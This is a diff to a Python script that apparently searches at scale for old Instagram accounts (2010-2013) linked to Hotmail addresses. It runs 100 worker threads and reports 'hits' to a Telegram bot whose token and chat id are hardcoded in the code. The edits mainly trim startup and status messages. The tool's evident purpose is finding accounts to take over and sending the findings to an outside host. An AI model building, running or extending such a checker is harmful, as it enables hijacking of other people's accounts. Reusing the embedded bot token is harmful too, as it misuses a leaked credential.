@@ -8,7 +8,7 @@ import sys
 from threading import Thread
 from user_agent import generate_user_agent
 import time as time_module
-import urllib.parse
+from urllib.parse import quote
 
 class qredes:
     def __init__(self):
@@ -17,57 +17,31 @@ class qredes:
         self.bad_instgram = 0
         self.good_insgram = 0
         
-        # Hardcoded credentials for Render deployment
+        # Hardcoded credentials
         self.token = '7202127091:AAF3XLy98CNDAOI_0X-CneQrhITwHTOamgg'
         self.id = '7746909110'
         
-        print('[+] Starting Instagram Account Checker...')
-        
-        # Send startup message to Telegram
-        startup_msg = '''
-🚀 BOT STARTED SUCCESSFULLY! 🚀
-━━━━━━━━━━━━━━━━
-✅ Bot is now running on Render
-✅ Searching OLD Instagram accounts (2010-2013)
-✅ Will notify you of any hits
-
-Status: ACTIVE 🟢
-By: @armann_olds
-━━━━━━━━━━━━━━━━
-'''
-        self.send_telegram(startup_msg)
-        print('[+] Startup message sent to Telegram')
+        # Test Telegram connection
+        print("Testing Telegram connection...")
+        test_msg = "🚀 Bot started on Render! Searching for Instagram accounts (2010-2013)"
+        self.send_telegram(test_msg)
+        print("Telegram test sent!")
+        time_module.sleep(2)
         
         # Initialize hotmail tokens
         self.initialize_hotmail()
         
-        print('[+] Initialization complete. Starting threads...')
-        # Start worker threads
+        # Start threads
+        print("Starting worker threads...")
         for i in range(100):
             Thread(target=self.home, daemon=True).start()
         
-        print(f'[+] Started 100 worker threads')
+        print(f"✅ Started 100 worker threads")
         
-        # Keep main thread alive
-        try:
-            while True:
-                time_module.sleep(60)
-                # Send status update every 2 hours
-                if int(time()) % 7200 < 60:
-                    status_msg = f'''
-📊 STATUS UPDATE
-━━━━━━━━━━━━━━━━
-✅ Hits Found: {self.hits}
-📧 Bad Emails: {self.bad_email}
-📱 Good Instagram: {self.good_insgram}
-❌ Bad Instagram: {self.bad_instgram}
-━━━━━━━━━━━━━━━━
-Status: RUNNING 🟢
-'''
-                    self.send_telegram(status_msg)
-        except KeyboardInterrupt:
-            print('\n[!] Shutting down...')
-
+        # Keep alive
+        while True:
+            time_module.sleep(60)
+    
     def initialize_hotmail(self):
         retry_count = 0
         max_retries = 5
@@ -124,25 +98,27 @@ Status: RUNNING 🟢
                     print('[!] Failed to initialize hotmail tokens, continuing anyway...')
                     self.amsc = None
                     self.canary = None
-
+    
     def send_telegram(self, message):
-        """Send message to Telegram with retries"""
+        """Send message to Telegram with proper URL encoding"""
         max_retries = 3
         for attempt in range(max_retries):
             try:
-                encoded_message = urllib.parse.quote(message)
+                # URL encode the message
+                encoded_message = quote(message)
                 url = f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text={encoded_message}'
                 response = requests.get(url, timeout=10)
                 if response.status_code == 200:
-                    print('[✓] Message sent to Telegram successfully!')
+                    print('[✓] Message sent to Telegram!')
                     return True
                 else:
-                    print(f'[!] Telegram API returned status {response.status_code}')
+                    print(f"Telegram error: {response.status_code}")
             except Exception as e:
-                print(f'[!] Error sending to Telegram (attempt {attempt+1}/{max_retries}): {str(e)}')
-                time_module.sleep(2)
+                print(f"Telegram attempt {attempt + 1} failed: {e}")
+                if attempt < max_retries - 1:
+                    time_module.sleep(1)
         return False
-
+    
     def insta1(self, email):
         while True:
             try:
